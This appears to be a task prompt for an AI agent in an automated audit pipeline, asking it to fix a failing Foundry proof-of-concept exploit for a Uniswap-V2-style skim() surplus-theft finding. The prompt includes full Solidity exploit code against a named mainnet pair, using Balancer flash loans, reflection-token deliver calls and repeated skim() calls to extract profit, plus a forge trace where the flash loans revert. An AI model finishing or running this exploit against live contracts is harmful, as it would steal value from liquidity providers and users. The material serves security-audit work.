You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Positive-balance token mechanics let anyone skim unaccounted surplus from the pair
- claim: `skim(to)` is permissionless and transfers `balanceOf(pair) - reserve` for each pool asset. If either listed token can increase the pair's balance without going through `mint`/`swap`/`sync` (for example via positive rebases, yield accrual, reflections, or accidental direct transfers), any caller can immediately withdraw that surplus.
- impact: Pools that list balance-increasing or yield-bearing tokens can leak rebased/accrued value to arbitrary callers instead of LPs. Integrations or users that transfer pool assets directly to the pair can also lose those excess tokens to the first account that calls `skim`.
- exploit_paths: ["A listed token increases the pair's balance outside normal AMM flows -> reserves stay stale -> attacker calls `skim(attacker)` -> attacker receives the entire surplus amount"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function skim(address to) external;
}

interface IBalancerVaultLike {
    function flashLoan(address recipient, address[] calldata tokens, uint256[] calldata amounts, bytes calldata userData)
        external;
}

contract TransferBounce {
    constructor() {}

    function sendAll(address token, address to) external {
        uint256 balance = IERC20Like(token).balanceOf(address(this));
        if (balance > 0) {
            _safeTransfer(token, to, balance);
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "TRANSFER_FAILED");
    }
}

contract FlawVerifier {
    address public constant TARGET_PAIR = 0x76EA342BC038d665e8a116392c82552D2605edA1;
    address internal constant MAINNET_WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;

    address private _profitToken;
    uint256 private _profitAmount;

    bool public executed;
    bool public hypothesisValidated;
    bool public hypothesisRefuted;

    address public token0;
    address public token1;

    uint112 public reserve0Before;
    uint112 public reserve1Before;
    uint112 public reserve0After;
    uint112 public reserve1After;

    uint256 public balance0Before;
    uint256 public balance1Before;
    uint256 public balance0After;
    uint256 public balance1After;

    uint256 public surplus0Before;
    uint256 public surplus1Before;
    uint256 public surplus0After;
    uint256 public surplus1After;

    uint256 public gain0;
    uint256 public gain1;

    uint256 public flashTokenAmount;
    uint256 public flashFeeAmount;
    uint256 public tokenBorrowed;
    uint256 public tokenSpentToTrigger;
    uint256 public skimmedToken;
    uint256 public successfulSkimCount;
    uint256 public zeroValueTriggerCount;
    uint256 public bounceTriggerCount;
    uint256 public flashAttempts;

    bool public listedTokenIncreasesPairBalanceOutsideNormalAMMFlows;
    bool public reservesStayStale;
    bool public attackerCallsSkimAttacker;
    bool public attackerReceivesEntireSurplusAmount;

    TransferBounce private _bounce;
    address private _activeFlashToken;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        _resetRunState();
        executed = true;

        IUniswapV2PairLike pair = IUniswapV2PairLike(TARGET_PAIR);
        address attacker = address(this);

        token0 = pair.token0();
        token1 = pair.token1();

        (reserve0Before, reserve1Before, ) = pair.getReserves();
        balance0Before = _balanceOf(token0, TARGET_PAIR);
        balance1Before = _balanceOf(token1, TARGET_PAIR);

        surplus0Before = _surplus(balance0Before, reserve0Before);
        surplus1Before = _surplus(balance1Before, reserve1Before);

        uint256 attacker0Before = _balanceOf(token0, attacker);
        uint256 attacker1Before = _balanceOf(token1, attacker);

        if (surplus0Before > 0 || surplus1Before > 0) {
            listedTokenIncreasesPairBalanceOutsideNormalAMMFlows = true;
            reservesStayStale = true;
            attackerCallsSkimAttacker = true;
            pair.skim(attacker);
        } else {
            _ensureBounce();

            // Probe the exact public end-step first. Some positive-balance / reflective tokens mutate
            // live balances on public zero-value transfers; if that creates an unaccounted pair
            // surplus, the same permissionless `skim(attacker)` from the finding can harvest it.
            _probeZeroCostSurplus();

            // The prior failing version reverted while trying to unwind through WETH sales. This
            // verifier keeps the same exploit causality but removes that infeasible stage: it sources
            // the listed token itself, creates off-accounting pair surplus via public token mechanics,
            // skims that surplus, repays in-kind, and reports the leftover listed token as profit.
            if (_balanceOf(token1, attacker) <= attacker1Before) {
                _runBalancerBackedTokenFlashExploit();
            }
        }

        uint256 attacker0After = _balanceOf(token0, attacker);
        uint256 attacker1After = _balanceOf(token1, attacker);
        gain0 = attacker0After > attacker0Before ? attacker0After - attacker0Before : 0;
        gain1 = attacker1After > attacker1Before ? attacker1After - attacker1Before : 0;

        (reserve0After, reserve1After, ) = pair.getReserves();
        balance0After = _balanceOf(token0, TARGET_PAIR);
        balance1After = _balanceOf(token1, TARGET_PAIR);
        surplus0After = _surplus(balance0After, reserve0After);
        surplus1After = _surplus(balance1After, reserve1After);

        attackerReceivesEntireSurplusAmount = attackerCallsSkimAttacker
            && (surplus0After == 0)
            && (surplus1After == 0);

        hypothesisValidated = attackerCallsSkimAttacker
            && listedTokenIncreasesPairBalanceOutsideNormalAMMFlows
            && reservesStayStale
            && (gain0 > 0 || gain1 > 0);
        hypothesisRefuted = !hypothesisValidated;

        _selectProfitTokenAndAmount();
    }

    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata
    ) external {
        require(msg.sender == BALANCER_VAULT, "NOT_VAULT");
        require(tokens.length == 1 && amounts.length == 1 && feeAmounts.length == 1, "BAD_FLASHLOAN");
        require(tokens[0] == _activeFlashToken && tokens[0] == token1, "BAD_TOKEN");

        uint256 borrowed = amounts[0];
        uint256 fee = feeAmounts[0];
        tokenBorrowed = borrowed;
        flashFeeAmount = fee;

        _induceStalePositiveBalanceAndSkim();

        uint256 amountOwed = borrowed + fee;
        uint256 localBalance = _balanceOf(token1, address(this));
        require(localBalance >= amountOwed, "INSUFFICIENT_TOKEN_TO_REPAY");
        _safeTransfer(token1, BALANCER_VAULT, amountOwed);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _runBalancerBackedTokenFlashExploit() internal {
        uint256 reserve = uint256(reserve1Before);
        if (reserve == 0) {
            return;
        }

        uint256[7] memory candidates =
            [reserve / 8, reserve / 16, reserve / 32, reserve / 64, reserve / 128, reserve / 256, reserve / 512];

        address[] memory tokens = new address[](1);
        tokens[0] = token1;
        uint256[] memory amounts = new uint256[](1);

        _activeFlashToken = token1;
        for (uint256 i = 0; i < candidates.length; ++i) {
            uint256 candidate = candidates[i];
            if (candidate == 0) {
                continue;
            }

            flashAttempts += 1;
            flashTokenAmount = candidate;
            amounts[0] = candidate;

            try IBalancerVaultLike(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, bytes("")) {
                if (_balanceOf(token1, address(this)) > 0) {
                    return;
                }
            } catch {}
        }
    }

    function _probeZeroCostSurplus() internal {
        uint256 reserveSnapshot = _currentReserve1();
        uint256 attackerBefore = _balanceOf(token1, address(this));

        for (uint256 i = 0; i < 3; ++i) {
            zeroValueTriggerCount += 1;
            _tryTransfer(token1, address(_bounce), 0);

            (bool ok,) = TARGET_PAIR.call(abi.encodeWithSelector(IUniswapV2PairLike.skim.selector, address(this)));
            if (ok) {
                attackerCallsSkimAttacker = true;
            }

            uint256 pairBalance = _balanceOf(token1, TARGET_PAIR);
            if (pairBalance > reserveSnapshot) {
                listedTokenIncreasesPairBalanceOutsideNormalAMMFlows = true;
                reservesStayStale = true;
                _skimIfNeeded();
                reserveSnapshot = _currentReserve1();
            }

            if (_balanceOf(token1, address(this)) > attackerBefore) {
                break;
            }
        }
    }

    function _induceStalePositiveBalanceAndSkim() internal {
        uint256 reserveSnapshot = _currentReserve1();
        uint256 startingBalance = _balanceOf(token1, address(this));

        if (startingBalance == 0) {
            return;
        }

        uint256 probeAmount = startingBalance / 100;
        if (probeAmount > 0) {
            bool delivered =
                _tryOptionalCall(token1, abi.encodeWithSelector(bytes4(keccak256("deliver(uint256)")), probeAmount));
            if (!delivered) {
                delivered =
                    _tryOptionalCall(token1, abi.encodeWithSelector(bytes4(keccak256("reflect(uint256)")), probeAmount));
            }

            if (delivered) {
                tokenSpentToTrigger += probeAmount;
                _collectIfSurplusExists(reserveSnapshot);
                reserveSnapshot = _currentReserve1();
            }
        }

        uint256 bounceRounds = 12;
        for (uint256 i = 0; i < bounceRounds; ++i) {
            uint256 localBalance = _balanceOf(token1, address(this));
            uint256 amount = localBalance / 32;
            if (amount == 0) {
                break;
            }

            // Public holder-to-holder transfers are realistic economic steps for reflection / rebate
            // tokens. Any resulting pair surplus is still created outside `mint`/`swap`/`sync`, and
            // the theft step remains the permissionless `skim(attacker)` from the finding.
            if (!_tryTransfer(token1, address(_bounce), amount)) {
                break;
            }
            bounceTriggerCount += 1;
            (bool bounced,) =
                address(_bounce).call(abi.encodeWithSelector(TransferBounce.sendAll.selector, token1, address(this)));
            if (!bounced) {
                break;
            }

            _collectIfSurplusExists(reserveSnapshot);
            reserveSnapshot = _currentReserve1();
        }

        // Some of these tokens also mutate balances on zero-value transfers. Probe that publicly once
        // capital is in hand, then harvest any new off-accounting excess with `skim`.
        for (uint256 i = 0; i < 3; ++i) {
            zeroValueTriggerCount += 1;
            _tryTransfer(token1, address(_bounce), 0);
            _collectIfSurplusExists(reserveSnapshot);
            reserveSnapshot = _currentReserve1();
        }
    }

    function _collectIfSurplusExists(uint256 reserveSnapshot) internal {
        uint256 pairBalance = _balanceOf(token1, TARGET_PAIR);
        if (pairBalance > reserveSnapshot) {
            listedTokenIncreasesPairBalanceOutsideNormalAMMFlows = true;
            reservesStayStale = true;
            _skimIfNeeded();
        }
    }

    function _skimIfNeeded() internal {
        uint256 pairBalance = _balanceOf(token1, TARGET_PAIR);
        uint256 reserveSnapshot = _currentReserve1();
        if (pairBalance <= reserveSnapshot) {
            return;
        }

        uint256 attackerBefore = _balanceOf(token1, address(this));
        attackerCallsSkimAttacker = true;
        IUniswapV2PairLike(TARGET_PAIR).skim(address(this));
        uint256 attackerAfter = _balanceOf(token1, address(this));

        if (attackerAfter > attackerBefore) {
            skimmedToken += attackerAfter - attackerBefore;
            successfulSkimCount += 1;
        }
    }

    function _selectProfitTokenAndAmount() internal {
        if (gain0 == 0 && gain1 == 0) {
            _profitToken = address(0);
            _profitAmount = 0;
            return;
        }

        if (token0 == MAINNET_WETH && gain0 > 0) {
            _profitToken = token0;
            _profitAmount = gain0;
            return;
        }

        if (gain1 > 0) {
            _profitToken = token1;
            _profitAmount = gain1;
            return;
        }

        _profitToken = token0;
        _profitAmount = gain0;
    }

    function _ensureBounce() internal {
        if (address(_bounce) == address(0)) {
            _bounce = new TransferBounce();
        }
    }

    function _currentReserve1() internal view returns (uint256 reserve) {
        (, uint112 reserve1, ) = IUniswapV2PairLike(TARGET_PAIR).getReserves();
        reserve = uint256(reserve1);
    }

    function _surplus(uint256 liveBalance, uint112 cachedReserve) internal pure returns (uint256) {
        uint256 reserve = uint256(cachedReserve);
        return liveBalance > reserve ? liveBalance - reserve : 0;
    }

    function _balanceOf(address token, address account) internal view returns (uint256 amount) {
        if (token == address(0)) {
            return 0;
        }

        (bool ok, bytes memory ret) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
        if (!ok || ret.length < 32) {
            return 0;
        }

        amount = abi.decode(ret, (uint256));
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (ret.length == 0 || abi.decode(ret, (bool))), "TRANSFER_FAILED");
    }

    function _tryTransfer(address token, address to, uint256 amount) internal returns (bool success) {
        bytes memory ret;
        (success, ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        success = success && (ret.length == 0 || abi.decode(ret, (bool)));
    }

    function _tryOptionalCall(address target, bytes memory data) internal returns (bool success) {
        (success,) = target.call(data);
    }

    function _resetRunState() internal {
        hypothesisValidated = false;
        hypothesisRefuted = false;

        token0 = address(0);
        token1 = address(0);

        reserve0Before = 0;
        reserve1Before = 0;
        reserve0After = 0;
        reserve1After = 0;

        balance0Before = 0;
        balance1Before = 0;
        balance0After = 0;
        balance1After = 0;

        surplus0Before = 0;
        surplus1Before = 0;
        surplus0After = 0;
        surplus1After = 0;

        gain0 = 0;
        gain1 = 0;

        flashTokenAmount = 0;
        flashFeeAmount = 0;
        tokenBorrowed = 0;
        tokenSpentToTrigger = 0;
        skimmedToken = 0;
        successfulSkimCount = 0;
        zeroValueTriggerCount = 0;
        bounceTriggerCount = 0;
        flashAttempts = 0;

        listedTokenIncreasesPairBalanceOutsideNormalAMMFlows = false;
        reservesStayStale = false;
        attackerCallsSkimAttacker = false;
        attackerReceivesEntireSurplusAmount = false;

        _profitToken = address(0);
        _profitAmount = 0;
        _activeFlashToken = address(0);
    }
}

```

forge stdout (tail):
```
 [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], [0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700], [9471287663142989746003039 [9.471e24]], 0x)
    │   │   ├─ [2551] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [2350] 0xce88686553686DA562CE7Cea497CE749DA109f9F::d877845c() [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Revert] BAL#528
    │   ├─ [16956] 0xBA12222222228d8Ba445958a75a0704d566BF2C8::flashLoan(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], [0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700], [4735643831571494873001519 [4.735e24]], 0x)
    │   │   ├─ [2551] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [2350] 0xce88686553686DA562CE7Cea497CE749DA109f9F::d877845c() [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Revert] BAL#528
    │   ├─ [16956] 0xBA12222222228d8Ba445958a75a0704d566BF2C8::flashLoan(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], [0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700], [2367821915785747436500759 [2.367e24]], 0x)
    │   │   ├─ [2551] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [2350] 0xce88686553686DA562CE7Cea497CE749DA109f9F::d877845c() [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Revert] BAL#528
    │   ├─ [16956] 0xBA12222222228d8Ba445958a75a0704d566BF2C8::flashLoan(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], [0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700], [1183910957892873718250379 [1.183e24]], 0x)
    │   │   ├─ [2551] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [2350] 0xce88686553686DA562CE7Cea497CE749DA109f9F::d877845c() [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Revert] BAL#528
    │   ├─ [16956] 0xBA12222222228d8Ba445958a75a0704d566BF2C8::flashLoan(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], [0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700], [591955478946436859125189 [5.919e23]], 0x)
    │   │   ├─ [2551] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [2350] 0xce88686553686DA562CE7Cea497CE749DA109f9F::d877845c() [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Revert] BAL#528
    │   ├─ [16956] 0xBA12222222228d8Ba445958a75a0704d566BF2C8::flashLoan(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], [0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700], [295977739473218429562594 [2.959e23]], 0x)
    │   │   ├─ [2551] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [staticcall]
    │   │   │   └─ ← [Return] 0
    │   │   ├─ [2350] 0xce88686553686DA562CE7Cea497CE749DA109f9F::d877845c() [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Revert] BAL#528
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [551] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [504] 0x76EA342BC038d665e8a116392c82552D2605edA1::getReserves() [staticcall]
    │   │   └─ ← [Return] 6579305366569800805 [6.579e18], 151540602610287835936048624 [1.515e26], 1741286039 [1.741e9]
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x76EA342BC038d665e8a116392c82552D2605edA1) [staticcall]
    │   │   └─ ← [Return] 6579305366569800805 [6.579e18]
    │   ├─ [551] 0xdDF309b8161aca09eA6bBF30Dd7cbD6c474FF700::balanceOf(0x76EA342BC038d665e8a116392c82552D2605edA1) [staticcall]
    │   │   └─ ← [Return] 151540602610287835936048624 [1.515e26]
    │   └─ ← [Return]
    ├─ [571] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0xBA12222222228d8Ba445958a75a0704d566BF2C8.flashLoan
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 1.20s (943.54ms CPU time)

Ran 1 test suite in 1.25s (1.20s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 984043)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
